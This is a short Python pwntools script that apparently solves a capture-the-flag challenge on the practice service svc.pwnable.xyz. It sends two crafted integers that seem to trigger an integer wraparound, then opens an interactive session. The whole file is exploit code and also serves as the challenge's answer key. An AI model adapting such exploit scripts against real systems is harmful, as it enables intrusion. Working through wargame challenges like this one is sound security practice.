from pwn import *


r = remote('svc.pwnable.xyz',30001)
v4 = 0
v5 = 0x100000000-4919
r.sendlineafter('input: ',str(v4)+' '+str(v5))
r.interactive()
